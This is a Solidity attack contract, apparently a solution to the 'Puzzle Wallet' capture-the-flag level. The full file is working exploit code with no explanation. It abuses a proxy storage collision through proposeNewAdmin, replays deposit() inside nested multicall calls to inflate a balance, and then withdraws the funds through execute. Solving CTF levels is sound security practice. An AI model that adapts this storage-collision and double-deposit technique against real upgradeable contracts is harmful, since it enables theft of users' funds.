// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.0;

interface PuzzleProxy{
    function pendingAdmin()external returns(address);
    function admin()external returns(address);
    function proposeNewAdmin(address) external ;
    function multicall(bytes[] calldata)external payable;
    function execute(address, uint256, bytes calldata) external;
}

contract PuzzleWalletAttack{
    PuzzleProxy public target;
    address public proxy_admin;
    address public proxy_pendingadmin;
    bytes[] public data = new bytes[](2);
    bytes[] public data2 = new bytes[](1);

    constructor(address _target){
        target=PuzzleProxy(_target);
    }
    function ProxyAdmin()public{
        proxy_admin=target.admin();
    }

    function proxyPendingAdmin()public{
        proxy_pendingadmin=target.pendingAdmin();
    }

    function NewAdmin() public {
        target.proposeNewAdmin(msg.sender);
    }

    function attack()public {
        data[0]=abi.encodeWithSignature("deposit()");
        data2[0]=abi.encodeWithSignature("deposit()");
        data[1]=abi.encodeWithSignature("multicall(bytes[])",data2);

        target.multicall{value: 0.001 ether}(data);
    }

    function sweepfunds()public{
        target.execute(msg.sender,0.002 ether,"");
    }

    fallback() external payable{

    }

    
}
